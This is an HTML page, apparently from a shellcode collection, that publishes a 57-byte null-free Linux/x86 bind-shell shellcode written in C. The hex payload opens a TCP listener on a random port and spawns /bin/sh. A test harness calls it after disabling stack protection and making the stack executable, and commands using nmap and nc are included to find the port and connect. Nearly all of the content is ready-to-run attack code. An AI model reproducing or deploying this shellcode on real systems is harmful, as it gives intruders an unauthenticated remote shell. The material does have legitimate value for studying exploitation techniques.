<html><head><title>Linux/x86 - Tiny Shell Bind TCP Random Port - 57 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*

 Tiny Shell Bind TCP Random Port Shellcode - C Language
 Linux/x86

 Written in 2013 by Geyslan G. Bem, Hacking bits

   http://hackingbits.com
   geyslan@gmail.com

 This source is licensed under the Creative Commons
 Attribution-ShareAlike 3.0 Brazil License.

 To view a copy of this license, visit

   http://creativecommons.org/licenses/by-sa/3.0/

 You are free:

    to Share - to copy, distribute and transmit the work
    to Remix - to adapt the work
    to make commercial use of the work

 Under the following conditions:
   Attribution - You must attribute the work in the manner
                 specified by the author or licensor (but
                 not in any way that suggests that they
                 endorse you or your use of the work).

   Share Alike - If you alter, transform, or build upon
                 this work, you may distribute the
                 resulting work only under the same or
                 similar license to this one.

*/

/*

 tiny_shell_bind_tcp_random_port_shellcode

 * 57 bytes
 * null-free


 # gcc -m32 -fno-stack-protector -z execstack tiny_shell_bind_tcp_random_port_shellcode.c -o tiny_shell_bind_tcp_random_port_shellcode

 Testing
 # ./tiny_shell_bind_tcp_random_port_shellcode
 # netstat -anp | grep shell
 # nmap -sS 127.0.0.1 -p-  (It's necessary to use the TCP SYN scan option [-sS]; thus avoids that nmap connects to th$
 # nc 127.0.0.1 port

*/


#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

unsigned char code[] = \

&quot;\x31\xdb\xf7\xe3\xb0\x66\x43\x52\x53\x6a&quot;
&quot;\x02\x89\xe1\xcd\x80\x52\x50\x89\xe1\xb0&quot;
&quot;\x66\xb3\x04\xcd\x80\xb0\x66\x43\xcd\x80&quot;
&quot;\x59\x93\x6a\x3f\x58\xcd\x80\x49\x79\xf8&quot;
&quot;\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62&quot;
&quot;\x69\x6e\x89\xe3\x41\xcd\x80&quot;;

main ()
{

        // When the Port contains null bytes, printf will show a wrong shellcode length.

	printf(&quot;Shellcode Length:  %d\n&quot;, strlen(code));

	// Pollutes all registers ensuring that the shellcode runs in any circumstance.

	__asm__ (&quot;movl $0xffffffff, %eax\n\t&quot;
		 &quot;movl %eax, %ebx\n\t&quot;
		 &quot;movl %eax, %ecx\n\t&quot;
		 &quot;movl %eax, %edx\n\t&quot;
		 &quot;movl %eax, %esi\n\t&quot;
		 &quot;movl %eax, %edi\n\t&quot;
		 &quot;movl %eax, %ebp\n\t&quot;

	// Calling the shellcode
		 &quot;call code&quot;);

}

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
